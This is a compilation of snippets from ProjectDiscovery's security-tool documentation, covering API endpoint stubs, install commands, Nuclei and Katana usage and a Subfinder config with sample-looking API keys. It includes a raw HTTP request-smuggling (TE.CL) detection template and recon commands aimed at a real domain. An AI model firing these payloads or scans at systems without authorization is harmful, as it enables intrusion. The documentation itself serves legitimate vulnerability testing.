YAML\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the GET /v1/template/leaderboard endpoint. It specifies the endpoint path, HTTP method, and basic metadata for the API documentation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/get-leaderboard.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/template/leaderboard\n```\n\n----------------------------------------\n\nTITLE: Defining DELETE Endpoint for Template Removal in OpenAPI\nDESCRIPTION: Specifies the OpenAPI path for deleting a template using its ID. The endpoint uses a DELETE HTTP method and includes a path parameter for the template ID.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/templates/delete-template.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/template/{template_id}\n```\n\n----------------------------------------\n\nTITLE: Making API Request to Trigger External Vulnerability Scan with ProjectDiscovery\nDESCRIPTION: This snippet demonstrates how to programmatically trigger an external vulnerability scan using ProjectDiscovery's REST API. It includes the endpoint URL, required authentication headers, and a sample JSON payload for configuring the scan.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/external-scan.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nPOST https://api.projectdiscovery.io/v1/scans\n```\n\n----------------------------------------\n\nTITLE: Installing Naabu via Go\nDESCRIPTION: Command to install ProjectDiscovery's Naabu tool using Go package manager.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/naabu/cmd/naabu@latest\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for /v1/scans in YAML\nDESCRIPTION: This YAML snippet defines an OpenAPI specification for a GET endpoint to retrieve scans. It specifies the path as /v1/scans and the HTTP method as GET. Additional details about parameters, responses, and other OpenAPI elements may be included in the full specification.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/get-scan-list.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/scans\n```\n\n----------------------------------------\n\nTITLE: Probing Assets with HTTPx\nDESCRIPTION: Command to probe discovered subdomains with HTTPx to identify active web services. This tool checks which domains are alive and collects information like HTTP status codes and page titles.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/quickstart/index.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nhttpx -l subdomains.txt -o live_hosts.txt -title -status-code -silent\n```\n\n----------------------------------------\n\nTITLE: Installing Subfinder via Go\nDESCRIPTION: This command installs Subfinder using Go. It requires the latest version of Go to be installed.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest\n```\n\n----------------------------------------\n\nTITLE: Installing cvemap using Go\nDESCRIPTION: Command to install ProjectDiscovery's cvemap tool using Go package manager.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cvemap/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install github.com/projectdiscovery/cvemap/cmd/cvemap@latest\n```\n\n----------------------------------------\n\nTITLE: Customizing Temporary File Pattern for Code Execution\nDESCRIPTION: Sets a custom pattern for the temporary file created during code execution, ensuring the file has the correct extension for the interpreter.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/code.mdx#2025-04-12_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\n    pattern: \"*.ps1\"\n```\n\n----------------------------------------\n\nTITLE: Opening ZSH Configuration File for PATH Update\nDESCRIPTION: Command to open the ZSH shell configuration file to update the PATH environment variable to include Go binary directory.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/nuclei-setup.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nnano ~/.zshrc\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Patch Endpoint for User Team in YAML\nDESCRIPTION: This YAML snippet specifies the OpenAPI endpoint for updating user team information. It defines the API path structure for the PATCH /v1/user/team operation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/update-team.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: patch /v1/user/team\n```\n\n----------------------------------------\n\nTITLE: Generating JS Protocol Docs for ProjectDiscovery Documentation\nDESCRIPTION: This command runs a shell script that generates the JS Protocol documentation. The script likely uses JSDoc-to-Markdown to convert JSDoc comments to markdown format.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/Home.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n./bin/jsdocs.sh\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for Template Sharing in YAML\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the GET /v1/template/share endpoint. It specifies the route for sharing templates within the ProjectDiscovery API.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/templates/get-share-status.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/template/share\n```\n\n----------------------------------------\n\nTITLE: Configuring Interactsh Settings in YAML\nDESCRIPTION: This YAML configuration demonstrates how to set up custom Interactsh (out-of-band testing) parameters in ProjectDiscovery. It defines a custom server, authentication token, and correlation timeout settings.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/parameters.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Custom OOB Settings\"\ntype: interactsh\nsettings:\n  server: \"custom.interactsh.com\"\n  token: \"your_token\"\n  correlation_timeout: 30\n```\n\n----------------------------------------\n\nTITLE: Installing httpx using Homebrew\nDESCRIPTION: Installs httpx using Homebrew package manager for macOS or Linux systems.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/install.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nbrew install httpx\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for POST /v1/assets Endpoint\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the POST /v1/assets endpoint. It includes the API version, endpoint path, and HTTP method.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/assets/upload-asset.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/assets\n```\n\n----------------------------------------\n\nTITLE: Card Group Layout Structure in Markdown\nDESCRIPTION: Markdown structure for displaying card groups containing links to documentation and resources\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/quickstart/index.mdx#2025-04-12_snippet_5\n\nLANGUAGE: markdown\nCODE:\n```\n<CardGroup cols={2}>\n  <Card\n    title=\"API Documentation\"\n    icon=\"code\"\n    href=\"/api-reference/introduction\"\n  >\n    Integrate ProjectDiscovery into your workflows using our REST APIs\n  </Card>\n  <Card\n    title=\"Platform Integrations\"\n    icon=\"plug\"\n    href=\"/cloud/integrations\"\n  >\n    Connect with ticketing, alerting, and cloud services\n  </Card>\n</CardGroup>\n```\n\n----------------------------------------\n\nTITLE: Highlighting uncover CLI command in Markdown\nDESCRIPTION: This snippet demonstrates how to format the 'uncover' command in Markdown. It's used to emphasize the tool's name in the documentation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/uncover/overview.mdx#2025-04-12_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`uncover`\n```\n\n----------------------------------------\n\nTITLE: Installing Subfinder via Docker\nDESCRIPTION: This command pulls the latest Subfinder Docker image.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/install.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ndocker pull projectdiscovery/subfinder:latest\n```\n\n----------------------------------------\n\nTITLE: Git Configuration for Type Definition Files\nDESCRIPTION: Sets up Git merge driver configuration to prevent conflicts with automatically generated type definition files during rebasing.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\n$ git config merge.ours.driver true\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Early Templates\nDESCRIPTION: OpenAPI specification for the GET /v1/template/early endpoint, which is used to retrieve early release templates from the ProjectDiscovery API.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/templates/get-early-template-list.mdx#2025-04-12_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /v1/template/early\n```\n\n----------------------------------------\n\nTITLE: Disabling PDCP Upload Warnings\nDESCRIPTION: Suppresses warnings about result uploads to PDCP by setting the DISABLE_CLOUD_UPLOAD_WRN environment variable to true.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/advanced.mdx#2025-04-12_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nexport DISABLE_CLOUD_UPLOAD_WRN=true\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Integration Patch Endpoint Definition\nDESCRIPTION: OpenAPI specification defining the PATCH endpoint for updating integration configurations. The endpoint path contains a name parameter to identify the specific integration to update.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/verify-integration.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: patch /v1/integration/{name}\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Path Specification for Vulnerability Export Endpoint\nDESCRIPTION: Defines the OpenAPI path specification for retrieving vulnerability scan export data by vulnerability ID.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/export-scan-vulnerability.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/scans/vuln/{vuln_id}/export\n```\n\n----------------------------------------\n\nTITLE: Installing React TypeScript Definitions via NPM\nDESCRIPTION: Command to install the React TypeScript definition package via NPM, which provides type definitions for React development in TypeScript projects.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/@types/react/README.md#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install --save @types/react\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Asset Contents Enumeration Endpoint\nDESCRIPTION: YAML-formatted OpenAPI specification for a GET endpoint that enumerates asset contents. The specification defines the endpoint path '/v1/asset/enumerate/contents'.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/enumerations/get-all-enumeration-contents.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/asset/enumerate/contents\n```\n\n----------------------------------------\n\nTITLE: Generating API Documentation\nDESCRIPTION: Script execution command to generate API reference documentation from the OpenAPI specification.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/README.md#2025-04-12_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n./bin/generate-api.sh\n```\n\n----------------------------------------\n\nTITLE: Querying Linear API for Team IDs in GraphQL\nDESCRIPTION: GraphQL query to retrieve team IDs from Linear. This query returns all teams with their respective IDs and names, which are required for configuring the Linear integration in ProjectDiscovery.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/integrations.mdx#2025-04-12_snippet_1\n\nLANGUAGE: graphql\nCODE:\n```\nquery {\n  teams {\n    nodes {\n      id\n      name\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Go binary path\nDESCRIPTION: Commands to add Go binary path to system PATH variable in Linux/macOS environments.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/install.mdx#2025-04-12_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\necho export PATH=$PATH:$HOME/go/bin >> $HOME/.bashrc\nsource $HOME/.bashrc\n```\n\n----------------------------------------\n\nTITLE: Defining Kerberos AuthorizationDataEntry Interface in TypeScript\nDESCRIPTION: TypeScript interface definition that specifies the structure for Kerberos authorization data entries. Contains two optional properties: ADType as a number and ADData as a Uint8Array for storing authorization data.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.AuthorizationDataEntry.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface AuthorizationDataEntry {\n    ADType?: number;\n    ADData?: Uint8Array;\n}\n```\n\n----------------------------------------\n\nTITLE: Installing JSDoc Markdown Generator\nDESCRIPTION: Command to install the JSDoc to Markdown converter globally using npm.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/README.md#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nnpm install -g jsdoc-to-markdown\n```\n\n----------------------------------------\n\nTITLE: Example Subfinder provider configuration\nDESCRIPTION: This YAML configuration file shows examples of how to set up API keys for various services used by Subfinder. Multiple API keys can be specified for each service.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/install.mdx#2025-04-12_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nbinaryedge:\n  - 0bf8919b-aab9-42e4-9574-d3b639324597\n  - ac244e2f-b635-4581-878a-33f4e79a2c13\ncensys:\n  - ac244e2f-b635-4581-878a-33f4e79a2c13:dd510d6e-1b6e-4655-83f6-f347b363def9\ncertspotter: []\npassivetotal:\n  - sample-email@user.com:sample_password\nredhuntlabs:\n  - ENDPOINT:API_TOKEN\n  - https://reconapi.redhuntlabs.com/community/v1/domains/subdomains:joEPzJJp2AuOCw7teAj63HYrPGnsxuPQ\nsecuritytrails: []\nshodan:\n  - AAAAClP1bJJSRMEYJazgwhJKrggRwKA\ngithub:\n  - ghp_lkyJGU3jv1xmwk4SDXavrLDJ4dl2pSJMzj4X\n  - ghp_gkUuhkIYdQPj13ifH4KA3cXRn8JD2lqir2d4\nzoomeyeapi:\n  - zoomeye.hk:4f73021d-ff95-4f53-937f-83d6db719eec\nquake:\n  - 0cb9030c-0a40-48a3-b8c4-fca28e466ba3\nfacebook:\n  - APP_ID:APP_SECRET\nintelx:\n  - HOST:API_KEY\n  - 2.intelx.io:s4324-b98b-41b2-220e8-3320f6a1284d\n```\n\n----------------------------------------\n\nTITLE: Checking for Oracle Server in JavaScript\nDESCRIPTION: This snippet demonstrates how to use the IsOracle function from the oracle module to check if a host is running an Oracle server. It takes a host and port as parameters and returns an IsOracleResponse object or null.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/oracle.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst oracle = require('nuclei/oracle');\nconst isOracle = oracle.IsOracle('acme.com', 1521);\nlog(toJSON(isOracle));\n```\n\n----------------------------------------\n\nTITLE: Defining Input for Dynamic Authentication in YAML\nDESCRIPTION: This YAML snippet shows how to specify the input or target server for dynamic authentication in Nuclei. It allows for easy switching between development and production environments.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/authenticated-scans.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\ninput: auth-server.projectdiscovery.io\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Path Specification\nDESCRIPTION: Defines the OpenAPI path specification for a POST request endpoint at /v1/retest\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/retests/create-retest.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/retest\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for Admin Scan Token in YAML\nDESCRIPTION: This YAML snippet specifies the OpenAPI path and HTTP method for the /v1/admin/scan/token endpoint. It uses the POST method, indicating it's likely used for creating or updating scan tokens in an administrative context.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/set-scan-token-for-user.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/admin/scan/token\n```\n\n----------------------------------------\n\nTITLE: Defining HostAddress Interface in TypeScript\nDESCRIPTION: TypeScript interface definition for Kerberos HostAddress structure. Contains optional AddrType property as a number and Address property as a Uint8Array for storing host addressing information.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.HostAddress.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface HostAddress {\n    AddrType?: number;\n    Address?: Uint8Array;\n}\n```\n\n----------------------------------------\n\nTITLE: Using CSSType with Flow\nDESCRIPTION: Example of using CSSType to type-check CSS properties in Flow. It shows how type errors are caught for incorrect property names and values.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n// @flow strict\nimport * as CSS from 'csstype';\n\nconst style: CSS.Properties<> = {\n  colour: 'white', // Type error on property\n  textAlign: 'middle', // Type error on value\n};\n```\n\n----------------------------------------\n\nTITLE: Generating New Key-Pair in Nuclei\nDESCRIPTION: Shows the interactive process of generating a new key-pair for template signing, including organization name and optional passphrase input.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/template-signing.mdx#2025-04-12_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ ./nuclei -t templates.yaml -sign\n[INF] Generating new key-pair for signing templates\n[*] Enter User/Organization Name (exit to abort) : acme\n[*] Enter passphrase (exit to abort): \n[*] Enter same passphrase again: \n[INF] Successfully generated new key-pair for signing templates\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for POST User Administration Endpoint\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the POST /v1/admin/users endpoint used for user administration.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/create-new-user.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/admin/users\n```\n\n----------------------------------------\n\nTITLE: Time Delay Analyzer Matcher Configuration\nDESCRIPTION: YAML configuration for matching analyzer responses using word-based matching on the analyzer part.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/fuzzing-overview.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nmatchers:\n  - type: word\n    part: analyzer\n    words:\n      - \"true\"\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for POST /v1/scans\nDESCRIPTION: YAML OpenAPI specification snippet defining the scan endpoint route\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/create-scan.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/scans\n```\n\n----------------------------------------\n\nTITLE: Defining PATCH Endpoint for Asset Updates in OpenAPI\nDESCRIPTION: OpenAPI specification snippet defining a PATCH endpoint for updating assets by their ID. The endpoint follows the pattern '/v1/assets/{asset_Id}' where asset_Id is a path parameter representing the unique identifier of the asset to be updated.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/assets/update-asset-metadata.mdx#2025-04-12_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: patch /v1/assets/{asset_Id}\n```\n\n----------------------------------------\n\nTITLE: Installing clsx via npm\nDESCRIPTION: Command to install the clsx package using npm.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/clsx/readme.md#2025-04-12_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ npm install --save clsx\n```\n\n----------------------------------------\n\nTITLE: Using CSSType with HTML Elements\nDESCRIPTION: Example of using CSSType to type-check CSS properties when applying styles to an HTML element. It demonstrates how to use Object.assign with a button element.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_8\n\nLANGUAGE: typescript\nCODE:\n```\nimport type * as CSS from 'csstype';\n\nconst style: CSS.Properties = {\n  color: 'red',\n  margin: '1em',\n};\n\nlet button = document.createElement('button');\n\nObject.assign(button.style, style);\n```\n\n----------------------------------------\n\nTITLE: Listing Nuclei Key Files\nDESCRIPTION: Shows the command to list and describes the key files generated by Nuclei in the configuration directory.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/template-signing.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ la ~/.config/nuclei/keys \ntotal 16\n-rw-------  1 tarun  staff   251B Oct  4 21:45 nuclei-user-private-key.pem # encrypted private key with passphrase\n-rw-------  1 tarun  staff   572B Oct  4 21:45 nuclei-user.crt # self signed certificate which includes public key and identifier (i.e user/org name)\n```\n\n----------------------------------------\n\nTITLE: Detecting Rsync Server in JavaScript\nDESCRIPTION: Example demonstrating how to check if a host is running an Rsync server using the nuclei/rsync module. Takes a hostname and port number as input and returns an IsRsyncResponse object or null.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rsync.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst rsync = require('nuclei/rsync');\nconst isRsync = rsync.IsRsync('acme.com', 873);\nlog(toJSON(isRsync));\n```\n\n----------------------------------------\n\nTITLE: Configuring Namecheap Provider in YAML\nDESCRIPTION: Example configuration block for integrating Namecheap with Cloudlist. Requires API access to be enabled and the user's public IP to be whitelisted.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: namecheap\n  id: staging\n  namecheap_api_key: $NAMECHEAP_API_KEY\n  namecheap_user_name: $NAMECHEAP_USER_NAME\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Scan Schedule Endpoint Definition\nDESCRIPTION: YAML definition for POST /v1/scans/schedule API endpoint\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/set-scan-schedule.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/scans/schedule\n```\n\n----------------------------------------\n\nTITLE: Differential Response TE.CL HTTP Smuggling Test\nDESCRIPTION: YAML template for confirming TE.CL HTTP smuggling vulnerability through differential responses by triggering 404 errors.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-smuggling-examples.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nid: confirming-te-cl-via-differential-responses-http-smuggling\n\ninfo:\n  name: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses\n  author: pdteam\n  severity: info\n  reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses\n\nhttp:\n  - raw:\n    - |+\n      POST / HTTP/1.1\n      Host: {{Hostname}}\n      Content-Type: application/x-www-form-urlencoded\n      Content-length: 4\n      Transfer-Encoding: chunked\n      \n      5e\n      POST /404 HTTP/1.1\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 15\n      \n      x=1\n      0\n    - |+\n      POST / HTTP/1.1\n      Host: {{Hostname}}\n      Content-Type: application/x-www-form-urlencoded\n      Content-length: 4\n      Transfer-Encoding: chunked\n      \n      5e\n      POST /404 HTTP/1.1\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 15\n      \n      x=1\n      0\n      \n    unsafe: true\n    matchers:\n      - type: dsl\n        dsl:\n          - 'status_code==404'\n```\n\n----------------------------------------\n\nTITLE: Setting Nuclei Environment Variables\nDESCRIPTION: Shows how to set environment variables for custom certificate and private key paths in Nuclei.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/template-signing.mdx#2025-04-12_snippet_4\n\nLANGUAGE: console\nCODE:\n```\n$ export NUCLEI_USER_CERTIFICATE=$(cat path/to/nuclei-user.crt)\n$ export NUCLEI_USER_PRIVATE_KEY=$(cat path/to/nuclei-user-private-key.pem)\n```\n\n----------------------------------------\n\nTITLE: Defining DELETE /v1/scans Endpoint in OpenAPI\nDESCRIPTION: OpenAPI specification snippet defining the DELETE endpoint for removing scan results. It specifies the path, HTTP method, and likely includes details on parameters, responses, and authentication requirements.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/delete-bulk-scans.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/scans\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for Stopping Scans\nDESCRIPTION: OpenAPI specification header defining the endpoint path for stopping a scan operation with a scan_id parameter.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/stop-scan.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/scans/{scan_id}/stop\n```\n\n----------------------------------------\n\nTITLE: Configuring Hetzner Cloud Provider in YAML\nDESCRIPTION: Example configuration block for integrating Hetzner Cloud with Cloudlist. Requires an authentication token from Hetzner Cloud.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: hetzner\n  id: staging\n  auth_token: $HETZNER_AUTH_TOKEN\n```\n\n----------------------------------------\n\nTITLE: Checking for VNC Server in JavaScript\nDESCRIPTION: This code snippet demonstrates how to use the IsVNC function to check if a host is running a VNC server. It imports the vnc module, calls the IsVNC function with a host and port, and logs the result.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/vnc.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst vnc = require('nuclei/vnc');\nconst isVNC = vnc.IsVNC('acme.com', 5900);\nlog(toJSON(isVNC));\n```\n\n----------------------------------------\n\nTITLE: Community Resources Card Group in Markdown\nDESCRIPTION: Markdown structure for displaying community resource links in a card group format\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/quickstart/index.mdx#2025-04-12_snippet_6\n\nLANGUAGE: markdown\nCODE:\n```\n<CardGroup cols={3}>\n  <Card\n    title=\"Community\"\n    icon=\"discord\"\n    href=\"https://discord.gg/projectdiscovery\"\n  >\n    Join our active community for support and discussions\n  </Card>\n  <Card\n    title=\"GitHub\"\n    icon=\"github\"\n    href=\"https://github.com/projectdiscovery\"\n  >\n    Explore our open-source tools and contribute\n  </Card>\n  <Card\n    title=\"Blog\"\n    icon=\"newspaper\"\n    href=\"https://blog.projectdiscovery.io\"\n  >\n    Read about security research and tool updates\n  </Card>\n</CardGroup>\n```\n\n----------------------------------------\n\nTITLE: Installing Minimum Required Dependencies for Chrome on Ubuntu\nDESCRIPTION: This command installs the minimum required dependencies for running Chrome on Ubuntu. It's useful when full browser installation is not possible or desired.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/faq.mdx#2025-04-12_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nsudo apt-get install libnss3 libgconf-2-4\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Definition for GET Scan Configuration Endpoint\nDESCRIPTION: OpenAPI specification defining the endpoint to retrieve a scan configuration by its ID. The specification includes the path parameter, response schema, and expected response structures.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/configurations/get-config.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/scans/config/{config_id}\n```\n\n----------------------------------------\n\nTITLE: Defining Custom HTTP Headers Configuration in YAML\nDESCRIPTION: This YAML example shows how to configure custom HTTP headers for API authentication in ProjectDiscovery. It includes an Authorization header with a bearer token and an additional custom header.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/parameters.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"API Authentication\"\ntype: http_headers\nheaders:\n  Authorization: \"Bearer {{token}}\"\n  X-Custom-Header: \"value\"\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Definition - Export Scan Results\nDESCRIPTION: YAML definition for the POST endpoint path to export scan results using a scan ID parameter.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/export-filtered-scan.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/scans/{scan_id}/export\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Display Out-of-Scope\nDESCRIPTION: Demonstrates how to display external URLs that exist in the target's scoped URL/endpoint.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -do\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Integration Deletion Endpoint\nDESCRIPTION: Defines the OpenAPI specification for the DELETE endpoint used to remove an integration by its name. The endpoint uses the path parameter 'name' to identify which integration to delete.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/delete-integration.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/integration/{name}\n```\n\n----------------------------------------\n\nTITLE: Using CSSType with TypeScript\nDESCRIPTION: Example of using CSSType to type-check CSS properties in TypeScript. It demonstrates how type errors are caught for incorrect property names and values.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\nimport type * as CSS from 'csstype';\n\nconst style: CSS.Properties = {\n  colour: 'white', // Type error on property\n  textAlign: 'middle', // Type error on value\n};\n```\n\n----------------------------------------\n\nTITLE: Response Directory Structure\nDESCRIPTION: Example output showing the structure of stored response files in the katana_response directory\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_31\n\nLANGUAGE: bash\nCODE:\n```\n$ cat 